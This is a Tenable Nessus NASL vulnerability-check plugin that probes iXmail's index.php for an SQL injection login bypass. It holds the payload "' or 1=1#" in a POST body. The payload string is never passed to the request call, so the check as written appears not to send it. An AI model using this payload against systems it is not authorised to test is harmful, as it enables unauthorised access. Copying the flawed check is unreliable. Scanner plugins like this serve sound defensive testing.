#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(11782);
 script_version ("$Revision: 1.14 $");
 script_bugtraq_id(8047);
 script_xref(name:"OSVDB", value:"53714");
 
 script_name(english:"iXmail index.php password Parameter SQL injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to an SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running the iXmail webmail interface. 

There is a flaw in this interface which allows an attacker to log in
as any user by using a SQL injection flaw in the code of index.php. 

An attacker may use this flaw to gain unauthorized access on this
host, or to gain the control of the remote database." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to iXMail 0.4." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );


script_end_attributes();

 script_summary(english: "Checks for iXMail");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2009 Tenable Network Security, Inc.");
 
 script_family(english: "CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

# The script code starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);

name = rand_str(charset: "aegijlnoprsvw", length: 6);
data = "username="+name+"&password=%27+or+1%3D1%23&login=Login";

h = make_array("Content-Type", "application/x-www-form-urlencoded");
foreach dir ( cgi_dirs() )
{
 r = http_send_recv3(port: port, method: 'POST', item: dir+"/index.php", add_headers: h);
 if (isnull(r)) exit(0);
 if(egrep(pattern:"^Location: ixmail_box\.php", string: r[1]))
 {
  security_hole(port);
  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
  exit(0);
 }
}
